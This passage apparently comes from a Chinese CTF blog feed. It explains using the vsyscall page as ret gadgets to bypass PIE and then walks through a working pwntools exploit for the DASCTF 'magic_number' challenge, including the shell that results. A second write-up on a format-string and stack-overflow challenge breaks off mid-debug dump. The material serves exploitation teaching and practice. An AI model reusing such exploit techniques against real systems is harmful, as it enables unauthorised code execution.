number">0000000000000400</span>                 mov     rax<span class="token punctuation">,</span> 0C9hseg000<span class="token operator">:</span><span class="token number">0000000000000407</span>                 syscall                 <span class="token punctuation">;</span> Low latency system callseg000<span class="token operator">:</span><span class="token number">0000000000000409</span>                 retnseg000<span class="token operator">:</span><span class="token number">0000000000000409</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>seg000<span class="token operator">:</span>000000000000040A                 align 400hseg000<span class="token operator">:</span><span class="token number">0000000000000800</span>                 mov     rax<span class="token punctuation">,</span> 135hseg000<span class="token operator">:</span><span class="token number">0000000000000807</span>                 syscall                 <span class="token punctuation">;</span> Low latency system callseg000<span class="token operator">:</span><span class="token number">0000000000000809</span>                 retnseg000<span class="token operator">:</span><span class="token number">0000000000000809</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>seg000<span class="token operator">:</span>000000000000080A                 align 800hseg000<span class="token operator">:</span>000000000000080A seg000          endsseg000<span class="token operator">:</span>000000000000080Aseg000<span class="token operator">:</span>000000000000080Aseg000<span class="token operator">:</span>000000000000080A                 end</code></pre><p>可以看到这里有三个系统调用，从上到下依次为gettimeofday，time，getcpu（查系统调用号）。都是系统调用，都包含syscall指令，也许这个syscall将来可以利用。</p><p>注意：<br><strong>当我们直接调用vsyscall中的syscall时，会提示段错误，这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错</strong><br><strong>所以，我们可以直接利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>由于这三个系统调用都是无参数传参，且地址固定，我们可以用来绕过PIE，原因是他们的影响性小且带有ret指令。就可以把这三个系统调用看作三个地址不同的ret指令。我们可以用他们不停的滑到下方栈地址</strong></p><h2 id="滑动绕过演示"><a href="#滑动绕过演示" class="headerlink" title="滑动绕过演示"></a>滑动绕过演示</h2><p>原理：<strong>利用栈里面的数据一般不会被清理干净，还保存着以前的信息可以为我们所用</strong></p><h3 id="DASCTF-七夕赛-magic-number"><a href="#DASCTF-七夕赛-magic-number" class="headerlink" title="DASCTF-七夕赛-magic_number"></a>DASCTF-七夕赛-magic_number</h3><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF<span class="token operator">/</span>七夕$ checksec magic_number<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/DASCTF/\xe4\xb8\x83\xe5\xa4\x95/magic_number'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Full RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      PIE enabled    就canary没开</code></pre><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-30h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">sub_9A0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">0x12345678</span> <span class="token punctuation">)</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your Input :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//溢出点很容易得到：0x30+8</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token keyword">signed</span> __int64 <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>那个rand()函数就是从/dev/urandom文件里面读入4个字节到buf，返回buf地址到main函数中的v5</li><li>想让v5 == 0x12345678但/dev/urandom文件无法改，又没有改v5值的方法，所以这是不可能的</li><li>main函数存在栈溢出</li><li>开启PIE，在栈中找到保存main函数中的某些地址（system）</li><li>利用栈溢出跳到system(‘/bin/sh’)处即可</li></ul><h4 id="gdb查看栈信息"><a href="#gdb查看栈信息" class="headerlink" title="gdb查看栈信息"></a>gdb查看栈信息</h4><p><strong>如果直接gdb调试失败，可以在脚本中插入gdb.attach(sh).或者向上面一样找到正在执行中magic_number的PID，用sudo gdb attach PID指令来调试</strong></p><pre class=" language-java"><code class="language-java">RBP<span class="token operator">:</span> <span class="token function">0x562182e3faf0</span> <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span>RSP<span class="token operator">:</span> <span class="token number">0x7ffe0b264818</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7f0fa29a0b97</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">231</span><span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span>eax<span class="token punctuation">)</span>RIP<span class="token operator">:</span> <span class="token function">0x562182e3fae6</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>R8 <span class="token operator">:</span> <span class="token function">0xc</span> <span class="token punctuation">(</span><span class="token string">'\x0c'</span><span class="token punctuation">)</span>R9 <span class="token operator">:</span> <span class="token function">0x7f0fa2f7d4c0</span> <span class="token punctuation">(</span><span class="token number">0x00007f0fa2f7d4c0</span><span class="token punctuation">)</span>R10<span class="token operator">:</span> <span class="token number">0x0</span> R11<span class="token operator">:</span> <span class="token number">0x246</span> R12<span class="token operator">:</span> <span class="token function">0x562182e3f870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span>R13<span class="token operator">:</span> <span class="token number">0x7ffe0b2648f0</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> R14<span class="token operator">:</span> <span class="token number">0x0</span> R15<span class="token operator">:</span> <span class="token number">0x0</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x207</span> <span class="token punctuation">(</span>CARRY PARITY adjust zero sign trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x562182e3fadb</span><span class="token operator">:</span>    call   <span class="token number">0x562182e3f838</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span>   <span class="token number">0x562182e3fae0</span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x562182e3fae5</span><span class="token operator">:</span>    leave  <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x562182e3fae6</span><span class="token operator">:</span>    ret       <span class="token number">0x562182e3fae7</span><span class="token operator">:</span>    nop    WORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span>rax<span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token punctuation">]</span>   <span class="token number">0x562182e3faf0</span><span class="token operator">:</span>    push   r15   <span class="token number">0x562182e3faf2</span><span class="token operator">:</span>    push   r14   <span class="token number">0x562182e3faf4</span><span class="token operator">:</span>    mov    r15d<span class="token punctuation">,</span>edi<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264818</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7f0fa29a0b97</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">231</span><span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span>eax<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264820</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264828</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7ffe0b2648f8</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ffe0b2652f0</span> <span class="token punctuation">(</span><span class="token string">"./magic_number"</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264830</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x100008000</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264838</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x562182e3fa80</span> <span class="token punctuation">(</span>push   rbp<span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264840</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264848</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf14225c379c56e4c</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264850</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x562182e3f870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span></code></pre><p>在要执行ret时，栈中发现栈第五行存放的地址和main函数中指令地址（ret及以上都是）就差后面两个16进制数。</p><p>找到main中执行system(‘/bin/sh’)的地址信息（用IDA）</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AA8 lea     rdi<span class="token punctuation">,</span> command    <span class="token punctuation">;</span> <span class="token string">"/bin/sh"</span>   《<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>目标<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AAF mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AB4 call    system<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AB9 loc_AB9<span class="token operator">:</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AB9 lea     rdi<span class="token punctuation">,</span> aYourInput <span class="token punctuation">;</span> <span class="token string">"Your Input :"</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AC0 call    puts<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AC5 lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>buf<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AC9 mov     edx<span class="token punctuation">,</span> 100h       <span class="token punctuation">;</span> nbytes<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000ACE mov     rsi<span class="token punctuation">,</span> rax        <span class="token punctuation">;</span> buf<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AD1 mov     edi<span class="token punctuation">,</span> <span class="token number">0</span>          <span class="token punctuation">;</span> fd<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AD6 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000ADB call    read<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AE0 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AE5 leave<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AE6 retn</code></pre><p>由以上信息易知：把栈第五行地址的后两位覆盖为：A8，然后用vsyscall滑到这里来就行了</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>vsyscall <span class="token operator">=</span> <span class="token number">0xffffffffff600000</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x30</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token operator">//</span>此处覆盖RBPpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\xA8'</span>   <span class="token operator">//</span>对应第五行栈sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./magic_number'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('183.129.189.60',10010)    </span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x59</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000030</span>  ef be ad de  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  │····│····│··`·│····│    <span class="token number">00000040</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  │··`·│····│··`·│····│    <span class="token number">00000050</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  a8                        │··`·│····│·│    <span class="token number">00000059</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p>详情见：<a href="http://blog.eonew.cn/archives/968" target="_blank" rel="noopener">http://blog.eonew.cn/archives/968</a>     <a href="https://www.anquanke.com/post/id/177520" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177520</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2020-7月赛--签到</title>
      <link href="/2020/08/24/dasctf2020-7-yue-sai-qian-dao/"/>
      <url>/2020/08/24/dasctf2020-7-yue-sai-qian-dao/</url>
      
        <content type="html"><![CDATA[<p>我之前不知道自己有多菜，然后参加了比赛才知道。。。。。菜的无底线，还请时钟大佬原谅</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>           <span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what's your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nCan you solve this sign-in problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  backdoor<span class="token punctuation">:</span>  <span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804857D push    ebp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804857E mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048580</span> sub     esp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048583</span> sub     esp<span class="token punctuation">,</span> 0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048586</span> push    offset command  <span class="token punctuation">;</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804858B call    _system<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048590</span> add     esp<span class="token punctuation">,</span> 10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048593</span> leave<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048594</span> retn</code></pre><p>v4距离栈底0x28，s距离栈底0x18都很容易溢出</p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF$ checksec qiandao<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/DASCTF/qiandao'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>基本操作</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在IDA中有两个很明显的漏洞:fmt漏洞  ，StackOverflow漏洞<br>当时我在做题的时候看到这两个漏洞，还有后门我觉这个题稳了。但是狡猾的出题人就时不会让我得偿所愿<del>~</del>·</p><p>我在构造溢出payload时总是无法跳转：payload = ’A’*0x28 + ‘AAAA’ + p32（backdoor），当场懵逼<del>~</del><br>然后再gdb调试的时候才发现了万恶之源。</p><pre class=" language-java"><code class="language-java">EAX<span class="token operator">:</span> <span class="token number">0x0</span> EBX<span class="token operator">:</span> <span class="token number">0x0</span> ECX<span class="token operator">:</span> <span class="token number">0xffffd060</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> EDX<span class="token operator">:</span> <span class="token number">0xf7fb389c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> ESI<span class="token operator">:</span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> EDI<span class="token operator">:</span> <span class="token number">0x0</span> EBP<span class="token operator">:</span> <span class="token number">0x0</span> ESP<span class="token operator">:</span> <span class="token number">0xffffd04c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>EIP<span class="token operator">:</span> <span class="token function">0x8048601</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token operator">:</span>    lea    esp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x282</span> <span class="token punctuation">(</span>carry parity adjust zero SIGN trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x80485f8</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x80485fd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    mov    ecx<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span>   <span class="token number">0x8048600</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span><span class="token operator">:</span>    leave  <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x8048601</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token operator">:</span>    lea    esp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span>   <span class="token number">0x8048604</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x8048605</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048607</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048609</span><span class="token 